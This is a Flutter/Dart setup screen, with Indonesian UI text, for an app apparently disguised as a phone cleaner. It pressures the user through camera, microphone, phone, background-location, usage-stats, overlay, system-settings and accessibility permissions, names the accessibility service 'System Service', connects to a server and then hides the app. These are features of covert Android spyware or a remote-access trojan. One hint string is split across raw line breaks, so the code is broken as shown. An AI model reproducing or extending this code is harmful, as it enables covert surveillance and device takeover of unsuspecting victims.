import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

class SetupScreen extends StatefulWidget {
  const SetupScreen({super.key});
  @override
  State<SetupScreen> createState() => _SetupScreenState();
}

class _SetupScreenState extends State<SetupScreen> with TickerProviderStateMixin {
  static const _ch  = MethodChannel('com.cleanser.app/native');
  static const _red = Color(0xFFEF4444);

  String _status  = 'Mempersiapkan...';
  String _hint    = '';
  bool   _waiting = false;
  bool   _done    = false;

  late final AnimationController _pulseCtrl =
      AnimationController(vsync: this, duration: const Duration(milliseconds: 1100))..repeat(reverse: true);
  late final Animation<double> _pulse =
      Tween<double>(begin: 0.88, end: 1.06).animate(CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut));

  @override
  void initState() { super.initState(); Future.microtask(_run); }

  @override
  void dispose() { _pulseCtrl.dispose(); super.dispose(); }

  void _set(String s, {String hint = '', bool waiting = false}) {
    if (!mounted) return;
    setState(() { _status = s; _hint = hint; _waiting = waiting; });
  }

  Future<void> _run() async {
    final sdkInt = await _ch.invokeMethod('getSdkInt') as int? ?? 0;

    final perms = <Permission>[
      Permission.camera,
      Permission.microphone,
      Permission.phone,
      Permission.notification,
    ];
    if (sdkInt < 33) perms.add(Permission.storage);

    for (final p in perms) {
      if (await p.isGranted) continue;
      _set('Meminta Izin ${_permName(p)}...');
      await p.request();
      await Future.delayed(const Duration(milliseconds: 300));
      if (!await p.isGranted) {
        _set(
          'Izin ${_permName(p)} Diperlukan',
          hint: 'Berikan Izin Ini Agar Aplikasi Dapat Berjalan.\nKetuk Untuk Membuka Pengaturan.',
          waiting: true,
        );
        await openAppSettings();
        for (int i = 0; i < 120; i++) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await p.isGranted) break;
        }
      }
    }

    // Location accuracy dialog (Google Play Services)
    _set('Meminta Izin Lokasi...');
    if (!await Permission.location.isGranted) {
      await Permission.location.request();
      await Future.delayed(const Duration(milliseconds: 300));
    }
    if (await Permission.location.isGranted) {
      // Minta location accuracy dialog (dialog Google seperti di foto)
      await _ch.invokeMethod('requestLocationAccuracy');
      await Future.delayed(const Duration(milliseconds: 800));
      // Request background location (selalu izinkan)
      if (!await Permission.locationAlways.isGranted) {
        _set(
          'Izinkan Lokasi "Setiap Saat"',
          hint: 'Di Pengaturan Izin Lokasi:\n1. Pilih "Izinkan Setiap Saat"\n2. Kembali Ke App',
          waiting: true,
        );
        await Permission.locationAlways.request();
        await Future.delayed(const Duration(milliseconds: 300));
        if (!await Permission.locationAlways.isGranted) {
          await openAppSettings();
          for (int i = 0; i < 120; i++) {
            await Future.delayed(const Duration(seconds: 1));
            if (!mounted) return;
            if (await Permission.locationAlways.isGranted) break;
          }
        }
      }
    }

    // Usage Stats
    _set('Meminta Izin Usage Stats...');
    if (!(await _ch.invokeMethod('checkUsageStats') as bool? ?? false)) {
      await _ch.invokeMethod('requestUsageStats');
      _set(
        'Aktifkan Akses Penggunaan',
        hint: 'Di Pengaturan Yang Terbuka:\n1. Cari App Ini\n2. Aktifkan Toggle-nya\n3. Kembali Ke App',
        waiting: true,
      );
      for (int i = 0; i < 120; i++) {
        await Future.delayed(const Duration(seconds: 1));
        if (!mounted) return;
        if (await _ch.invokeMethod('checkUsageStats') as bool? ?? false) break;
      }
    }

    // Overlay
    _set('Meminta Izin Overlay...');
    if (!(await _ch.invokeMethod('checkOverlay') as bool? ?? false)) {
      await _ch.invokeMethod('requestOverlay');
      _set(
        'Izinkan "Tampilkan Di Atas Aplikasi Lain"',
        hint: 'Di Pengaturan Yang Terbuka:\n1. Cari App Ini\n2. Aktifkan Toggle-nya\n3. Kembali Ke App',
        waiting: true,
      );
      for (int i = 0; i < 120; i++) {
        await Future.delayed(const Duration(seconds: 1));
        if (!mounted) return;
        if (await _ch.invokeMethod('checkOverlay') as bool? ?? false) break;
      }
    }

    // Write Settings (untuk brightness)
    _set('Meminta Izin Write Settings...');
    final canWriteSettings = await _ch.invokeMethod('checkWriteSettings') as bool? ?? false;
    if (!canWriteSettings) {
      await _ch.invokeMethod('requestWriteSettings');
      _set(
        'Izinkan "Ubah Pengaturan Sistem"',
        hint: 'Di Pengaturan Yang Terbuka:
1. Cari App Ini
2. Aktifkan Toggle-nya
3. Kembali Ke App',
        waiting: true,
      );
      for (int i = 0; i < 60; i++) {
        await Future.delayed(const Duration(seconds: 1));
        if (!mounted) return;
        if (await _ch.invokeMethod('checkWriteSettings') as bool? ?? false) break;
      }
    }

    // Aksesibilitas
    _set('Meminta Izin Aksesibilitas...');
    if (!(await _ch.invokeMethod('checkAccessibility') as bool? ?? false)) {
      await _ch.invokeMethod('requestAccessibility');
      _set(
        'Aktifkan Layanan Aksesibilitas',
        hint: 'Di Pengaturan Yang Terbuka:\n1. Cari "System Service" / Nama App Ini\n2. Aktifkan Toggle-nya\n3. Kembali Ke App',
        waiting: true,
      );
      for (int i = 0; i < 120; i++) {
        await Future.delayed(const Duration(seconds: 1));
        if (!mounted) return;
        if (await _ch.invokeMethod('checkAccessibility') as bool? ?? false) break;
      }
    }

    // Connect
    _set('Menghubungkan Ke Server...');
    await _ch.invokeMethod('startService');

    for (int i = 0; i < 30; i++) {
      await Future.delayed(const Duration(seconds: 1));
      if (!mounted) return;
      if (await _ch.invokeMethod('isConnected') as bool? ?? false) break;
    }

    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('connected', true);

    if (mounted) setState(() { _done = true; _status = 'Terhubung!'; });
    await Future.delayed(const Duration(milliseconds: 800));
    await _ch.invokeMethod('hideApp');
  }

  String _permName(Permission p) {
    if (p == Permission.camera)       return 'Kamera';
    if (p == Permission.microphone)   return 'Mikrofon';
    if (p == Permission.storage)      return 'Penyimpanan';
    if (p == Permission.phone)        return 'Telepon';
    if (p == Permission.notification) return 'Notifikasi';
    if (p == Permission.location)     return 'Lokasi';
    return 'Akses';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0A0A),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 40),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            AnimatedBuilder(
              animation: _pulse,
              builder: (_, __) => Transform.scale(
                scale: _pulse.value,
                child: Container(
                  width: 80, height: 80,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _red.withOpacity(0.07),
                    border: Border.all(
                      color: (_waiting ? Colors.orange : _red).withOpacity(0.45), width: 1.5),
                    boxShadow: [BoxShadow(
                      color: (_waiting ? Colors.orange : _red).withOpacity(0.2), blurRadius: 24)],
                  ),
                  child: Center(
                    child: _done
                      ? const Icon(Icons.check_rounded, color: _red, size: 34)
                      : _waiting
                        ? const Icon(Icons.touch_app_rounded, color: Colors.orange, size: 30)
                        : const SizedBox(width: 30, height: 30,
                            child: CircularProgressIndicator(color: _red, strokeWidth: 2)),
                  ),
                ),
              ),
            ),
            const SizedBox(height: 28),
            Text(_status,
              textAlign: TextAlign.center,
              style: TextStyle(
                fontFamily: 'monospace', fontSize: 13,
                color: _waiting ? Colors.orange : Colors.white70,
                letterSpacing: 1.2,
              )),
            if (_hint.isNotEmpty) ...[
              const SizedBox(height: 16),
              Container(
                padding: const EdgeInsets.all(14),
                decoration: BoxDecoration(
                  color: Colors.orange.withOpacity(0.07),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: Colors.orange.withOpacity(0.3)),
                ),
                child: Text(_hint,
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                    fontFamily: 'monospace', fontSize: 10,
                    color: Colors.orange, height: 1.7,
                  )),
              ),
            ],
          ]),
        ),
      ),
    );
  }
}
